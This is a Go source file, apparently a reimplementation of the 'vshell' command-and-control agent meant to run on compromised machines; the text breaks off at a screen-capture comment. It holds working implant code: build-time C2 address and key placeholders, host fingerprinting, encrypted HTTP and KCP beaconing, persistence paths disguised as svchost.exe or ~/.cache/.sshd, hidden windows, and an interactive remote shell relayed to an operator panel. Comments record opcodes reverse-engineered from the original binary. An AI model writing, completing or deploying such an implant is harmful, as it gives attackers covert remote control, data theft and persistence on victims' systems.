// Package agent 实现运行在目标系统上的 vshell Agent，支持 HTTP、DNS、KCP 与 WebSocket 传输模式。
// Package agent implements the vshell agent that runs on target systems.
// Supports HTTP, DNS, KCP, and WebSocket transport modes.
//
//go:build !server
// +build !server

package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	kcp "github.com/xtaci/kcp-go/v5"
)

// ============================================================================
// Embedded Configuration (patched at build time via ldflags)
// 嵌入式配置（构建时通过 ldflags 修补）
// ============================================================================
var (
	ServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	VerifyKey   = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
	EncryptSalt = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
	ProxyAddr   = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	CDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
	DNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"

	sleepTime    = 5
	jitterTime   = 3
	clientID     int64
	sessionID    string
	hostname     string
	username     string
	osName       = runtime.GOOS
	arch         = runtime.GOARCH
	processName  string
	localIP      string
	pid          int
	agentVersion = "3.1.0"
	transport    Transport
	persistPath  string
)

func init() {
	pid = os.Getpid()
	hostname, _ = os.Hostname()
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	if username == "" {
		username = os.Getenv("USER")
	}
	if exe, err := os.Executable(); err == nil {
		processName = exe
	} else {
		processName = os.Args[0]
	}
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipn, ok := addr.(*net.IPNet); ok && !ipn.IP.IsLoopback() && ipn.IP.To4() != nil {
				localIP = ipn.IP.String()
				break
			}
		}
	}

	// Default persistence path
	if runtime.GOOS == "windows" {
		persistPath = os.Getenv("APPDATA") + "\\Microsoft\\Windows\\svchost.exe"
	} else {
		persistPath = os.Getenv("HOME") + "/.cache/.sshd"
	}

	log.SetPrefix(fmt.Sprintf("[%d] ", pid))
}

// ============================================================================
// System info gathering
// 系统信息收集
// ============================================================================

// SysInfo 保存 Agent 上报的系统信息。
// SysInfo holds the system info reported by the agent.
type SysInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	Arch        string   `json:"arch"`
	CPUCores    int      `json:"cpu_cores"`
	PID         int      `json:"pid"`
	PPID        int      `json:"ppid"`
	ProcessName string   `json:"process_name"`
	LocalIPs    []string `json:"local_ips"`
	IsAdmin     bool     `json:"is_admin"`
	Uptime      string   `json:"uptime"`
	GoVersion   string   `json:"go_version"`
}

// getSysInfo 收集并返回系统信息。
// getSysInfo collects and returns system info.
func getSysInfo() *SysInfo {
	info := &SysInfo{
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		CPUCores:    runtime.NumCPU(),
		PID:         pid,
		PPID:        os.Getppid(),
		ProcessName: processName,
		GoVersion:   runtime.Version(),
	}

	// Check admin/root
	if runtime.GOOS == "windows" {
		info.IsAdmin = isWindowsAdmin()
	} else {
		info.IsAdmin = os.Geteuid() == 0
	}

	// Collect all local IPs
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipn, ok := addr.(*net.IPNet); ok && ipn.IP.To4() != nil {
			info.LocalIPs = append(info.LocalIPs, ipn.IP.String())
		}
	}

	return info
}

// isWindowsAdmin 判断当前是否以管理员权限运行。
// isWindowsAdmin reports whether the process runs with administrator privileges.
func isWindowsAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

// ============================================================================
// Transport interface and implementations
// 传输接口与实现
// ============================================================================

// Transport 抽象不同 C2 传输模式（HTTP/KCP/DNS/WebSocket）。
// Transport abstracts the different C2 transport modes (HTTP/KCP/DNS/WebSocket).
type Transport interface {
	Checkin() (*CheckinResponse, error)
	GetTasks() ([]TaskItem, error)
	SendResult(taskID int64, result, status string) error
	Close() error
}

// --- HTTP Transport ---
// HTTP 传输

type httpTransport struct {
	serverURL string
	client    *http.Client
}

// newHTTPTransport 创建 HTTP 传输。
// newHTTPTransport creates an HTTP transport.
func newHTTPTransport(url string) *httpTransport {
	return &httpTransport{
		serverURL: strings.TrimRight(url, "/"),
		client:    &http.Client{Timeout: 30 * time.Second},
	}
}

// postJSON 向服务器发送 JSON 请求。
// 消息体经 AES-256-GCM 帧加密（与 TCP/KCP 统一格式，服务器对所有入站
// 帧 GCM Open），base64 编码放入 HTTP body。
// postJSON sends a JSON request to the server. The body is wrapped in the
// AES-256-GCM message frame (same key/format as TCP/KCP), base64-encoded.
func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, error) {
	enc := encryptFrame(data)
	body := []byte(base64.StdEncoding.EncodeToString(enc))
	return t.client.Post(t.serverURL+path, "application/json", bytes.NewReader(body))
}

// Checkin 执行 Agent 签到。
// Checkin performs the agent check-in.
func (t *httpTransport) Checkin() (*CheckinResponse, error) {
	req := CheckinRequest{
		VerifyKey:   VerifyKey,
		HostName:    hostname,
		UserName:    username,
		OsName:      runtime.GOOS,
		ProcessName: processName,
		LocalIP:     localIP,
		Arch:        runtime.GOARCH,
		PID:         pid,
		Version:     agentVersion,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/checkin", body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var cr CheckinResponse
	json.NewDecoder(resp.Body).Decode(&cr)
	if cr.ClientID > 0 {
		clientID = cr.ClientID
		sessionID = cr.SessionID
	}
	if cr.Interval > 0 {
		sleepTime = cr.Interval
	}
	return &cr, nil
}

// GetTasks 轮询待处理任务。
// GetTasks polls for pending tasks.
func (t *httpTransport) GetTasks() ([]TaskItem, error) {
	url := fmt.Sprintf("%s/api/tasks?client_id=%d&verify_key=%s", t.serverURL, clientID, url.QueryEscape(VerifyKey))
	resp, err := t.client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var tr TaskResponse
	json.NewDecoder(resp.Body).Decode(&tr)
	if tr.Interval > 0 {
		sleepTime = tr.Interval
	}
	if tr.Tasks == nil {
		return nil, nil
	}
	return tr.Tasks, nil
}

// SendResult 回传任务结果。
// 消息体与签到一样经 AES-256-GCM 帧加密（服务器在 JSON 解析失败时回退到
// FrameDecrypt 解帧）。
// SendResult submits a task result. The body is wrapped in the same
// AES-256-GCM message frame as check-in (the server falls back to
// FrameDecrypt when plain JSON parsing fails).
func (t *httpTransport) SendResult(taskID int64, result, status string) error {
	req := ResultRequest{
		ClientID:  clientID,
		CommandID: taskID,
		Result:    result,
		Status:    status,
		VerifyKey: VerifyKey,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/result", body)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// Close 关闭 HTTP 传输（无状态，空操作）。
// Close closes the HTTP transport (stateless, no-op).
func (t *httpTransport) Close() error { return nil }

// --- KCP Transport ---
// KCP 传输：服务器 KCP 监听器（c2engine/kcp.go）是带 AES 块加密 + FEC 的 kcp-go UDP
// 监听器，Agent 必须使用相同的线协议：
//
// The server's KCP listener (c2engine/kcp.go) is a kcp-go UDP listener with
// AES block crypt + FEC. The agent must speak the same wire protocol:
//   - connection: kcp-go UDP session (NOT plain TCP/UDP sockets)
//   - handshake: bare JSON check-in payload (no length prefix, no type byte)
//   - subsequent messages: [2-byte big-endian length][1-byte LinkMsgType][payload]
// The link message type constants mirror c2engine.LinkMsgType.

const (
	linkMsgMain   = 0x01 // main data channel (task poll, results)
	linkMsgConfig = 0x02 // configuration sync
	linkMsgChan   = 0x03 // tunnel/proxy data
	linkMsgHealth = 0x04 // health/heartbeat
	linkMsgClose  = 0x05 // close connection
)

// kcpTransport 是基于 KCP 的传输实现。
// kcpTransport is the KCP-based transport implementation.
type kcpTransport struct {
	serverAddr string
	sess       *kcp.UDPSession
	mu         sync.Mutex
}

// newKCPTransport 创建 KCP 传输。
// newKCPTransport creates a KCP transport.
func newKCPTransport(addr string) *kcpTransport {
	return &kcpTransport{serverAddr: addr}
}

// kcpBlockCrypt derives the AES key exactly as the server does: the raw
// concatenated salt+key material padded to 32 bytes (the server's plain [:32]
// slice panics on short keys, so both sides pad instead).
func kcpBlockCrypt(salt, key string) kcp.BlockCrypt {
	m := []byte(salt + key)
	if len(m) < 32 {
		m = append(m, make([]byte, 32-len(m))...)
	}
	block, _ := kcp.NewAESBlockCrypt(m[:32])
	return block
}

// connect 建立 KCP 会话。
// connect establishes the KCP session.
func (t *kcpTransport) connect() error {
	if t.sess != nil {
		t.sess.Close()
		t.sess = nil
	}
	sess, err := kcp.DialWithOptions(t.serverAddr, kcpBlockCrypt(EncryptSalt, VerifyKey), 10, 3)
	if err != nil {
		return err
	}
	// Mirror the server-side session tuning (acceptLoop).
	sess.SetStreamMode(true)
	sess.SetWriteDelay(false)
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 128)
	sess.SetMtu(1350)
	t.sess = sess
	return nil
}

// maxKCPFrame keeps a single frame under the link protocol's 2-byte length
// prefix (65535) with headroom for the type byte; larger payloads are split
// into fragments and reassembled server-side.
const maxKCPFrame = 60000

// writeFrame 发送类型化、长度前缀消息（链路协议）。
// 消息体经 AES-256-GCM 帧加密（与 TCP 消息帧同 key/格式，服务器统一
// GCM Open 解密）。
// writeFrame sends a typed, length-prefixed message (link protocol).
// The payload is wrapped in the AES-256-GCM message frame (same key/
// format as TCP frames; the server GCM-opens every inbound frame).
func (t *kcpTransport) writeFrame(msgType byte, data []byte) error {
	if t.sess == nil {
		if err := t.connect(); err != nil {
			return err
		}
	}
	enc := encryptFrame(data)
	if len(enc)+1 > maxKCPFrame {
		return t.writeFragmented(data)
	}
	msg := make([]byte, 1+len(enc))
	msg[0] = msgType
	copy(msg[1:], enc)

	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
		t.sess.Close()
		t.sess = nil
		return err
	}
	return nil
}

// writeFragmented 将超大载荷（如截图或屏幕帧）拆分为 maxKCPFrame 大小的分片，
// 每个分片是携带 {"_frag":k,"_total":n,"_data":<base64 chunk>} 的 LinkMsgMain
// 帧，服务器在处理前重组。
// writeFragmented splits an oversized payload (e.g. a screenshot or screen
// frame) into maxKCPFrame-sized fragments. Each fragment is a LinkMsgMain
// frame carrying {"_frag":k,"_total":n,"_data":<base64 chunk>}; the server
// reassembles them before handling the message.
func (t *kcpTransport) writeFragmented(data []byte) error {
	const chunkBytes = maxKCPFrame / 4 * 3 // base64 expands 4/3
	var chunks [][]byte
	for len(data) > 0 {
		n := len(data)
		if n > chunkBytes {
			n = chunkBytes
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	total := len(chunks)
	for i, c := range chunks {
		frag, _ := json.Marshal(map[string]interface{}{
			"_frag":  i,
			"_total": total,
			"_data":  base64.StdEncoding.EncodeToString(c),
		})
		msg := make([]byte, 1+len(frag))
		msg[0] = linkMsgMain
		copy(msg[1:], frag)
		lenBuf := make([]byte, 2)
		binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
		t.sess.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
			t.sess.Close()
			t.sess = nil
			return err
		}
	}
	return nil
}

// readFrame 读取一条类型化、长度前缀消息，跳过服务器心跳（服务器每 10 秒推送 LinkMsgHealth）。
// 消息体经 AES-256-GCM 帧解密。
// readFrame reads one typed, length-prefixed message, skipping server
// heartbeats (the server pushes LinkMsgHealth every 10s on its own).
// The payload is GCM-opened (same frame format as TCP).
func (t *kcpTransport) readFrame() (byte, []byte, error) {
	if t.sess == nil {
		return 0, nil, io.ErrClosedPipe
	}
	for {
		lenBuf := make([]byte, 2)
		t.sess.SetReadDeadline(time.Now().Add(15 * time.Second))
		if _, err := io.ReadFull(t.sess, lenBuf); err != nil {
			return 0, nil, err
		}
		length := binary.BigEndian.Uint16(lenBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(t.sess, data); err != nil {
			return 0, nil, err
		}
		if length == 0 {
			return 0, nil, nil
		}
		if data[0] == linkMsgHealth {
			continue
		}
		pt, err := decryptFrame(data[1:])
		if err != nil {
			return 0, nil, err
		}
		return data[0], pt, nil
	}
}

func (t *kcpTransport) Checkin() (*CheckinResponse, error) {
	hs := map[string]interface{}{
		"verify_key": VerifyKey,
		"hostname":   hostname,
		"username":   username,
		"os":         runtime.GOOS,
		"process":    processName,
	}
	data, _ := json.Marshal(hs)

	t.mu.Lock()
	defer t.mu.Unlock()

	if t.sess == nil {
		if err := t.connect(); err != nil {
			return nil, err
		}
	}
	// Handshake: bare JSON, exactly what the server's handleSession reads.
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(data); err != nil {
		t.sess.Close()
		t.sess = nil
		return nil, err
	}

	msgType, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	if msgType != linkMsgMain {
		return nil, fmt.Errorf("unexpected check-in response type %d", msgType)
	}
	var cr CheckinResponse
	if err := json.Unmarshal(resp, &cr); err != nil {
		return nil, err
	}
	if cr.ClientID > 0 {
		clientID = cr.ClientID
	}
	return &cr, nil
}

func (t *kcpTransport) GetTasks() ([]TaskItem, error) {
	req, _ := json.Marshal(map[string]interface{}{"type": "task_poll", "client_id": clientID, "verify_key": VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	if err := t.writeFrame(linkMsgMain, req); err != nil {
		return nil, err
	}
	_, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	var tr TaskResponse
	if err := json.Unmarshal(resp, &tr); err != nil {
		return nil, err
	}
	return tr.Tasks, nil
}

func (t *kcpTransport) SendResult(taskID int64, result, status string) error {
	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	// The server does not acknowledge individual results (LinkMsgMain handler
	// only stores/forwards them), so no response read here.
	return t.writeFrame(linkMsgMain, req)
}

func (t *kcpTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.sess != nil {
		t.writeFrame(linkMsgClose, nil)
		t.sess.Close()
		t.sess = nil
	}
	return nil
}

// ============================================================================
// Message types
// 协议消息类型
// ============================================================================

// CheckinRequest 是签到请求。
// CheckinRequest is the check-in request.
type CheckinRequest struct {
	VerifyKey   string `json:"verify_key"`
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	PID         int    `json:"pid,omitempty"`
	Version     string `json:"version,omitempty"`
}

// CheckinResponse 是签到响应。
// CheckinResponse is the check-in response.
type CheckinResponse struct {
	Status    string `json:"status"`
	ClientID  int64  `json:"client_id"`
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"`
	Timeout   int    `json:"timeout"`
	Message   string `json:"message,omitempty"`
}

// TaskResponse 是任务轮询响应。
// TaskResponse is the task polling response.
type TaskResponse struct {
	Tasks    []TaskItem `json:"tasks"`
	Interval int        `json:"interval"`
}

// TaskItem 是单条任务。
// TaskItem is a single task.
type TaskItem struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}

// ResultRequest 是结果回传请求。
// ResultRequest is the result submission request.
type ResultRequest struct {
	ClientID  int64  `json:"client_id"`
	CommandID int64  `json:"command_id"`
	Result    string `json:"result"`
	Status    string `json:"status"`
	// VerifyKey proves the caller knows the listener key; the server rejects
	// task/result requests without it when the listener has a key set.
	VerifyKey string `json:"verify_key,omitempty"`
}

// ============================================================================
// Command execution
// 命令执行
// ============================================================================

const (
	CmdShell      = "shell"
	CmdUpload     = "upload"
	CmdDownload   = "download"
	CmdSleep      = "sleep"
	CmdExit       = "exit"
	CmdScreenshot = "screenshot"
	CmdScreen     = "screen"
	CmdFileList   = "filelist"
	CmdFileDelete = "filedelete"
	CmdFileMove   = "filemove"
	CmdFileTouch  = "filetouch"
	CmdFileMkdir  = "filemkdir"
	CmdFileCat    = "filecat"
	CmdDiskInfo   = "diskinfo"
	CmdPS         = "ps"
	CmdKill       = "kill"
	CmdSysInfo    = "sysinfo"
	CmdPersist    = "persist"
	CmdCleanup    = "cleanup"
	CmdProxy      = "proxy"
	CmdProxyStop  = "proxystop"
	CmdPlugin     = "plugin"
	CmdWget       = "wget"
)

// ============================================================================
// Native command opcodes — FUN_010952e0
// 原生命令操作码
//
// The original agent's task-execute dispatcher FUN_010952e0 (0x10952e0) is a
// jump table indexed by the FIRST BYTE of the task's command buffer, with table
// entries for 0x00–0x2a. The decompiled state machine has no handler block for
// 0x04 (its table slot is duplicated: two adjacent handlers share one state) or
// 0x18 (no reachable state), so the reachable entries are listed below:
//
//   反编译（FUN_010952e0，跳转表 DAT_1dc31ce0，pbVar2 = 命令首字节）：
//   byte 0x00 cmdInterval      interval get/set（无参数=上报，有参数=设置休眠间隔）
//   byte 0x01 cmdScreenshot    截图（有参数=描述串）
//   byte 0x02 cmdSleepMode     sleep mode get/set
//   byte 0x03 cmdDebugLog      debug-log 开关
//   byte 0x05 cmdTunnelLog     tunnel 日志级别
//   byte 0x06 cmdNetCheck      网络检查开关
//   byte 0x07 cmdTunnelDump    tunnel 信息落盘开关
//   byte 0x08 (无参数时为空操作；有参数=FUN_00fbd720 解密 argv[0] 后未再使用)
//   byte 0x09 （始终 FUN_011054c0 循环 + FUN_0100d3c0(1,...)，未见发送分支）
//   byte 0x0a cmdSetGateway    argv[0] 写入 DAT_1e490968（网关/前置地址）
//   byte 0x0b (loop over 0x20-byte records with +8 != 0)
//   byte 0x0c cmdSetSendDelay  argv[0] 取绝对值 → 发送延迟/分包大小（FUN_0100d160(100,...)）
//   byte 0x0d cmdSetWorkMode   工作模式名字（表 DAT_1e2e9ee0）
//   byte 0x0e cmdPortMapDump   端口映射/转发表 dump（FUN_0109b6xx 大分支）
//   byte 0x0f cmdConnDump      连接列表 dump
//   byte 0x10 cmdPipeDump      管道/代理列表 dump
//   byte 0x11 cmdPingInterval  ping 间隔 get/set
//   byte 0x12 cmdTcpPing       tcp ping 次数 get/set
//   byte 0x13 cmdIfList        网卡/接口列表
//   byte 0x14 cmdIfDetail      单个接口详情
//   byte 0x15 cmdSysList       系统列表 dump（会话/进程/服务，43KB 分支）
//   byte 0x16 cmdNetRoute      网络接口/路由选择
//   byte 0x17 cmdMtu           MTU get/set
//   byte 0x19 cmdSysTime       系统时间 get/set
//   byte 0x1a cmdPing          ping/pong（argv[0] 为往返毫秒；opcode 字节 == 'p' 时无参数）
//   byte 0x1b cmdReconnect     重连（argv[0] 为下次重连间隔；同时记录 *piStack+1）
//   byte 0x1c cmdProxyList     代理列表 dump
//   byte 0x1d cmdHostScan      主机/网段扫描
//   byte 0x1e cmdUploadSpeed   上传限速 get/set（FUN_00fee3a0）
//   byte 0x1f cmdFileList      文件列表 —— argv[0] 是 0x43 项「命令名表」
//                              DAT_1e302680（项长 0x18）中的一项
//   byte 0x20 cmdClientLimit   许可/客户端上限 get/set（FUN_00fee740 → 许可限制位）
//   byte 0x21 cmdReloadLicense 重新加载 license（FUN_010fc480）
//   byte 0x22 cmdDestroy       销毁/退出（参数为秒数；无参数 → FUN_00fb7c80(-1)）
//   byte 0x23 cmdTunnelCount   tunnel 数量 get/set
//   byte 0x24 cmdProcList      进程列表（每进程一条 7 字段帧）
//   byte 0x25 cmdSvcList       服务/功能列表
//   byte 0x26 cmdSysInfo       系统信息 get/set
//   byte 0x27 cmdSetDomain     argv[0] 写入 DAT_1e490960（域名/SNI）
//   byte 0x28 cmdKeepAlive     keep-alive 秒数 get/set
//   byte 0x29 cmdThreadCount   线程/协程数 get/set
//   byte 0x2a cmdFwdPort       转发端口 1/2/3（FUN_0100d160(3,...)）
//
// All result frames are built by pushing "commands" into the engine's output
// buffer via FUN_0100d160 / FUN_0100d440 / FUN_0100d5e0; see the frame-shape
// notes next to resultFrameOps.
//
// 注意/CAVEAT：下面每个操作码的助记名是依据分支行为给出的描述性标签，并非从
// 二进制里还原出的字符串（原版的命令文字串在运行期由 init 代码写入
// DAT_1e490a08+0x44xx 段后才被 DAT_1e302680 的 key 指针引用，静态数据段全为 0，
// 见 FUN_010952e0 case 0x1f 与 FUN_01094d80）。操作码字节本身与分支行为是实锤。
// The mnemonics below are descriptive labels for the branch behaviour, not
// recovered literals: the original command strings are materialised at runtime
// (init writes DAT_1e490a08+0x44xx; the static image holds zeros), which is why
// the DAT_1e302680 key pointers are null in the file image. The opcode bytes
// and the branch behaviour are confirmed.
// ============================================================================

const (
	opCmdInterval    = 0x00 // interval get/set（原版 case 0x0）
	opCmdScreenshot  = 0x01 // 截图（原版 case 0x1）
	opCmdSleepMode   = 0x02 // sleep mode（原版 case 0x2）
	opCmdDebugLog    = 0x03 // debug-log 开关（原版 case 0x3）
	opCmdTunnelLog   = 0x05 // tunnel 日志（原版 case 0x5）
	opCmdNetCheck    = 0x06 // 网络检查（原版 case 0x6）
	opCmdTunnelDump  = 0x07 // tunnel 信息开关（原版 case 0x7）
	opCmdSetGateway  = 0x0a // 网关/前置地址（原版 case 0xa）
	opCmdSetSendDly  = 0x0c // 发送延迟（原版 case 0xc）
	opCmdSetWorkMode = 0x0d // 工作模式（原版 case 0xd）
	opCmdPortMapDump = 0x0e // 端口映射 dump（原版 case 0xe）
	opCmdConnDump    = 0x0f // 连接 dump（原版 case 0xf）
	opCmdPipeDump    = 0x10 // 管道/代理 dump（原版 case 0x10）
	opCmdPingIntv    = 0x11 // ping 间隔（原版 case 0x11）
	opCmdTcpPing     = 0x12 // tcp ping 次数（原版 case 0x12）
	opCmdIfList      = 0x13 // 接口列表（原版 case 0x13）
	opCmdIfDetail    = 0x14 // 接口详情（原版 case 0x14）
	opCmdSysList     = 0x15 // 系统列表 dump（原版 case 0x15）
	opCmdNetRoute    = 0x16 // 路由/接口选择（原版 case 0x16）
	opCmdMtu         = 0x17 // MTU（原版 case 0x17）
	opCmdSysTime     = 0x19 // 系统时间（原版 case 0x19）
	opCmdPing        = 0x1a // ping/pong（原版 case 0x1a）
	opCmdReconnect   = 0x1b // 重连（原版 case 0x1b）
	opCmdProxyList   = 0x1c // 代理列表（原版 case 0x1c）
	opCmdHostScan    = 0x1d // 主机扫描（原版 case 0x1d）
	opCmdUploadSpeed = 0x1e // 上传限速（原版 case 0x1e）
	opCmdFileList    = 0x1f // 文件列表（原版 case 0x1f）
	opCmdClientLimit = 0x20 // 许可/客户端上限（原版 case 0x20）
	opCmdRelicense   = 0x21 // 重载 license（原版 case 0x21）
	opCmdDestroy     = 0x22 // 销毁/退出（原版 case 0x22）
	opCmdTunnelCount = 0x23 // tunnel 数量（原版 case 0x23）
	opCmdProcList    = 0x24 // 进程列表（原版 case 0x24）
	opCmdSvcList     = 0x25 // 服务列表（原版 case 0x25）
	opCmdSysInfo     = 0x26 // 系统信息（原版 case 0x26）
	opCmdSetDomain   = 0x27 // 域名/SNI（原版 case 0x27）
	opCmdKeepAlive   = 0x28 // keep-alive（原版 case 0x28）
	opCmdThreadCount = 0x29 // 线程数（原版 case 0x29）
	opCmdFwdPort     = 0x2a // 转发端口（原版 case 0x2a）
)

// resultFrameOps 记录原版结果帧的分发点：
//
//	FUN_0100d160（push 一条固定记录：op, a, b, c）
//	FUN_0100d440（按格式串 's'/'i' 把参数编码成 0x4b/0x75/0x47 记录，末尾补 0x54）
//	FUN_0100d5e0（先 push 记录再挂 load，供 FUN_0100eac0 填充）
//
// agentState 保存原版客户端对象中被这些 opcode 读写的运行时字段。
// agentState holds the runtime fields these opcodes read/write on the original
// client object (offsets in FUN_010952e0: +0x60 interval, +0x64 sleep mode,
// +0x69/+0x6a work mode, +0x74 upload speed, +0x304 keep-alive).
var (
	agentSleepMode    int  // 原版 local_280+0x60 / +0x66 对应的休眠模式
	agentWorkMode     int  // 原版 *local_280+0x6a 工作模式（FUN_010943e0）
	agentPingInterval int  // 原版 case 0x11（FUN_0109c340 / FUN_00fc1000）
	agentKeepAlive    int  // 原版 case 0x28（local_398+0x298）
	agentClientLimit  = -1 // 原版 case 0x20：-1 = 未设置
	agentSendDelay    int  // 原版 case 0xc：发送延迟/分包（FUN_0100d160(100,...)）
	agentFwdPort      int  // 原版 case 0x2a：转发端口 1/2/3
	agentDebugMask    int  // 原版 case 0x3：local_280[6] 的调试/日志标志位
)

// ============================================================================
// Interactive remote terminal session
// 交互式远程终端会话
//
// The web panel's terminal relays to the agent via these commands:
//   terminal_start type=<bash|sh|cmd> rows=N cols=M
//   terminal_input:<base64>   terminal_resize rows=N cols=M
//   terminal_close
// The agent spawns a shell, keeps it across tasks, and streams the shell's
// output back as "terminal_output:<base64>" results (the server relays those
// to the browser's terminal WebSocket live).
// ============================================================================

// agentTermSession 保存交互式终端会话状态。
// agentTermSession holds interactive terminal session state.
type agentTermSession struct {
	mu     sync.Mutex
	cmd    *exec.Cmd
	stdin  io.WriteCloser
	taskID int64
	active bool
	// waitOnce ensures cmd.Wait() is called exactly once per session (shell-exit
	// goroutine OR terminalClose). It is replaced on every startTerminal: a
	// sync.Once value would fire only once for the agent's whole lifetime and
	// break every terminal session after the first.
	waitOnce *sync.Once
}

var termSess agentTermSession

// submitTerminalOutput streams shell output to the server as a terminal_output
// result bound to the terminal's task ID (the server routes by client ID).
func submitTerminalOutput(taskID int64, data []byte) {
	if transport == nil {
		return
	}
	enc := base64.StdEncoding.EncodeToString(data)
	if err := transport.SendResult(taskID, "terminal_output:"+enc, "completed"); err != nil {
		log.Printf("Terminal output send failed: %v", err)
	}
}

func startTerminal(termType string, rows, cols int, taskID int64) (string, string) {
	termSess.mu.Lock()
	defer termSess.mu.Unlock()

	if termSess.active {
		// Replace any existing session: kill it, then reap it through the old
		// session's own once so we never double-Wait with the previous session's
		// exit goroutine (exec.Cmd.Wait must not be called concurrently).
		oldCmd := termSess.cmd
		oldOnce := termSess.waitOnce
		if oldCmd != nil && oldCmd.Process != nil {
			oldCmd.Process.Kill()
		}
		termSess.mu.Unlock()
		if oldOnce != nil {
			oldOnce.Do(func() { oldCmd.Wait() })
		}
		termSess.mu.Lock()
		termSess.active = false
	}

	shell := "/bin/bash"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		switch termType {
		case "sh":
			shell = "/bin/sh"
		case "bash":
			shell = "/bin/bash"
		}
	}

	cmd := exec.Command(shell)
	hideCmdWindow(cmd)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err.Error()
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err.Error()
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err.Error()
	}
	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	termSess.cmd = cmd
	termSess.stdin = stdin
	termSess.taskID = taskID
	termSess.active = true
	// Fresh once per session: the shell-exit goroutine and terminalClose share
	// this pointer only, so a later session's once is never consumed here.
	once := &sync.Once{}
	termSess.waitOnce = once

	readLoop := func(r io.Reader) {
		buf := make([]byte, 4096)
		for {
			n, err := r.Read(buf)
			if n > 0 {
				// submitTerminalOutput base64-encodes synchronously before the
				// next Read reuses buf, so passing buf[:n] directly is safe.
				submitTerminalOutput(taskID, buf[:n])
			}
			if err != nil {
				return
			}
		}
	}
	go readLoop(stdout)
	go readLoop(stderr)

	// Detect shell self-exit (e.g. the user typed `exit`): mark the session
	// inactive so terminal_input stops writing to a dead pipe, and let the
	// readLoop goroutines wind down on EOF. waitOnce guards cmd.Wait() so this
	// never races terminalClose's own Wait.
	go func() {
		once.Do(func() { cmd.Wait() })
		termSess.mu.Lock()
		// Only tear down our own session; a stale exit goroutine must not kill
		// a replacement session that started after we exited.
		if termSess.cmd == cmd {
			termSess.active = false
		}
		termSess.mu.Unlock()
		log.Printf("Terminal (task %d) exited", taskID)
	}()

	log.Printf("Terminal started (%s), task %d", shell, taskID)
	return "terminal started", ""
}

func terminalInput(encoded string) (string, string) {
	// Copy the stdin reference under the lock, then write WITHOUT holding it:
	// a pipe write blocks once the shell's stdin buffer fills and the shell
	// isn't draining it, which would otherwise stall the whole agent (the task
	// loop is single-threaded).
	termSess.mu.Lock()
	if !termSess.active || termSess.stdin == nil {
		termSess.mu.Unlock()
		return "", "no active terminal"
	}
	stdin := termSess.stdin
	termSess.mu.Unlock()

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err.Error()
	}
	if _, err := stdin.Write(data); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func terminalClose() (string, string) {
	termSess.mu.Lock()
	cmd := termSess.cmd
	once := termSess.waitOnce
	if termSess.active && cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}
	termSess.active = false
	termSess.mu.Unlock()

	// Reap the process outside the lock; the session's once prevents a race
	// with the shell-exit goroutine's own Wait.
	if cmd != nil && once != nil {
		once.Do(func() { cmd.Wait() })
	}
	return "terminal closed", ""
}

// ============================================================================
// Screen capture streaming
// 屏幕捕获流
//
//   screen_capture_start quality=N fps=M
//   screen_capture_stop      screen_capture_quality=N   screen_capture_fps=N
//
